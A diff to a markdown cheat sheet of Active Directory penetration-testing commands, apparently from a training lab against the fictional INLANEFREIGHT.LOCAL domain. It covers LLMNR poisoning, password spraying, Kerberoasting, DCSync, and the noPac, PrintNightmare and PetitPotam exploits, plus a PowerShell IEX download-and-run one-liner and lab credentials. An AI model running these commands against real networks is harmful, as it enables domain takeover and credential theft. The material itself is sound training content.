@@ -1,5 +1,5 @@
 # Initial Enumeration
-
+```bash
 `nslookup ns1.inlanefreight.com` # Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.
 
 `sudo tcpdump -i ens224` # Used to start capturing network packets on the network interface proceeding the -i option a Linux-based host.
@@ -21,9 +21,9 @@
 `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute` # Used to move the Kerbrute binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.
 
 `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` # Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
-
+```
 # LLMNR/NTB-NS Poisoning
-
+```bash
 `responder -h` # Used to display the usage instructions and various options available in Responder from a Linux-based host.
 
 `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` # Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
@@ -37,9 +37,9 @@
 `.\Inveigh.exe` # Starts the C# implementation of Inveigh from a Windows-based host.
 
 `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` # PowerShell script used to disable NBT-NS on a Windows host.
-
+```
 # Password Spraying & Password Policies
-
+```bash
 `#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done` # Bash script used to generate 16,079,616 possible username combinations from a Linux-based host.
 
 `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` # Uses CrackMapExecand valid credentials (avazquez:Password123) to enumerate the password policy (--pass-pol) from a Linux-based host.
@@ -83,9 +83,9 @@
 `Import-Module .\DomainPasswordSpray.ps1` # Used to import the PowerShell-based tool DomainPasswordSpray.ps1 from a Windows-based host.
 
 `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` # Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
-
+```
 # Enumerating Security Controls
-
+```bash
 `Get-MpComputerStatus` # PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host.
 
 `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` # PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
@@ -97,9 +97,9 @@
 `Find-AdmPwdExtendedRights` # A LAPSTookit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host.
 
 `Get-LAPSComputers` # A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.
-
+```
 # Credentialed Enumeration
-
+```bash
 `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` # Connects to a Windows target using valid credentials. Performed from a Linux-based host.
 
 `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` # Authenticates with a Windows target over smb using valid credentials and attempts to discover more users (--users) in a target Windows domain. Performed from a Linux-based host.
@@ -131,9 +131,9 @@
 `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\wley -p transporter@4 -PU` # Used to perform a recursive search (-PU) for users with nested permissions using valid credentials.
 
 `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` # Executes the python implementation of BloodHound (bloodhound.py) with valid credentials and specifies a name server (-ns) and target Windows domain (inlanefreight.local) as well as runs all checks (-c all). Runs using valid credentials. Performed from a Linux-based host.
-
+```
 # Enumeration by Living Off the Land
-
+```bash
 `Get-Module` # PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.
 
 `Import-Module ActiveDirectory` # Loads the Active Directory PowerShell module from a Windows-based host.
@@ -211,17 +211,17 @@
 `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` # PowerView script used to find users on the target Windows domain that have the Service Principal Name set. Performed from a Windows-based host.
 
 `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data` # Runs a tool called Snaffler against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.
-
+```
 # Transfering Files
-
+```bash
 `sudo python3 -m http.server 8001` # Starts a python web server for quick hosting of files. Performed from a Linux-basd host.
 
 `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` # PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.
 
 `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` # Starts a impacket SMB server for quick hosting of a file. Performed from a Windows-based host.
-
+```
 # Kerberoasting
-
+```bash
 `sudo python3 -m pip install .` # Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.
 
 `GetUserSPNs.py -h` # Impacket tool used to display the options and functionality of GetUserSPNs.py from a Linux-based host.
@@ -279,9 +279,9 @@
 `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` # Used to attempt to crack the ticket hash using a wordlist (rockyou.txt) from a Linux-based host .
 
 `Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname` # Duplicate entry: Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
-
+```
 # ACL Enumeration & Tactics
-
+```bash
 `Find-InterestingDomainAcl` # PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
 
 `Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley` # Used to import PowerView and retrieve the SID of a specific user account (wley) from a Windows-based host.
@@ -315,9 +315,9 @@
 `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose` # PowerView tool used to remove a specific user (damundsent) from a specific security group (Help Desk Level 1) from a Windows-based host.
 
 `ConvertFrom-SddlString` # PowerShell cmd-let used to covert an SDDL string into a readable format. Performed from a Windows-based host.
-
+```
 # DCSync
-
+```bash
 `Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl` # PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
 
 `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl` # Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool Get-ObjectAcl to check a specific user's replication rights. Performed from a Windows-based host.
@@ -325,9 +325,9 @@
 `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` # Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (172.16.5.5) and save the extracted hashes to an file (inlanefreight_hashes). Performed from a Linux-based host.
 
 `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` # Uses Mimikatz to perform a dcsync attack from a Windows-based host.
-
+```
 # Privileged Access
-
+```bash
 `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` # PowerView based tool to used to enumerate the Remote Desktop Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host.
 
 `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` # PowerView based tool to used to enumerate the Remote Management Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host.
@@ -355,9 +355,9 @@
 `SQL> enable_xp_cmdshell` # Used to enable xp_cmdshell stored procedure that allows for executing OS commands via the database from a Linux-based host.
 
 `xp_cmdshell whoami /priv` # Used to enumerate rights on a system using xp_cmdshell.
-
+```
 # NoPac
-
+```bash
 `sudo git clone https://github.com/Ridter/noPac.git` # Used to clone a noPac exploit using git. Performed from a Linux-based host.
 
 `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` # Runs scanner.py to check if a target system is vulnerable to noPac/Sam_The_Admin from a Linux-based host.
@@ -365,9 +365,9 @@
 `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` # Used to exploit the noPac/Sam_The_Admin vulnerability and gain a SYSTEM shell (-shell). Performed from a Linux-based host.
 
 `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` # Used to exploit the noPac/Sam_The_Admin vulnerability and perform a DCSync attack against the built-in Administrator account on a Domain Controller from a Linux-based host.
-
+```
 # PrintNightmare
-
+```bash
 `git clone https://github.com/cube0x0/CVE-2021-1675.git` # Used to clone a PrintNightmare exploit using git from a Linux-based host.
 
 `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install` # Used to ensure the exploit author's (cube0x0) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.
@@ -379,9 +379,9 @@
 `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` # Used to create an SMB server and host a shared folder (CompData) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.
 
 `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` # Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.
-
+```
 # PetitPotam
-
+```bash
 `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` # Impacket tool used to create an NTLM relay by specifiying the web enrollment URL for the Certificate Authority host. Perfomred from a Linux-based host.
 
 `git clone https://github.com/topotam/PetitPotam.git` # Used to clone the PetitPotam exploit using git. Performed from a Linux-based host.
@@ -401,9 +401,9 @@
 `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` # Uses Rubeus to request a TGT and perform a pass-the-ticket attack using the machine account (/user:ACADEMY-EA-DC01$) of a Windows target. Performed from a Windows-based host.
 
 `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt` # Performs a DCSync attack using Mimikatz. Performed from a Windows-based host.
-
+```
 # Miscellaneous Misconfigurations
-
+```bash
 `Import-Module .\SecurityAssessment.ps1` # Used to import the module Security Assessment.ps1. Performed from a Windows-based host.
 
 `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` # SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
@@ -417,7 +417,7 @@
 `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol` # PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
 
 `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts` # Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.
-
+```
 # Group Policy Enumeration & Attacks
 
 `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE` # Tool used to decrypt a captured group policy preference password from a Linux-based host.
